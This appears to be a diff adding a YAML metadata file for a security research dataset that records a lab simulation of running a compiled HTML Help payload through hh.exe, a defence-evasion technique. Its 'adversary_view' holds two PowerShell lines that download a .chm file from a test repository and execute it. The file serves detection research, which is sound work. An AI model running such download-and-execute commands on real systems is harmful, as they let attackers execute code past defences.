@@ -1,0 +1,35 @@
+title: HH Execution of Local Compiled HTML Payload
+id: SDWIN-201022002145
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/22
+modification_date: 2020/10/22
+platform:
+- Windows
+type: atomic
+tags:
+  - art.5cb87818-0d7c-4469-b7ef-9224107aebe8
+description: This dataset represents threat actors executing local compiled HTML Help payloads via hh.exe.
+attack_mappings:
+  - technique: T1218
+    sub-technique: "001"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_hh_local_html_payload.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: powershell
+      module: powershell
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md#atomic-test-1---compiled-html-help-local-payload
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile C:\ProgramData\T1218.001.chm
+    hh.exe C:\ProgramData\T1218.001.chm
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md#atomic-test-1---compiled-html-help-local-payload
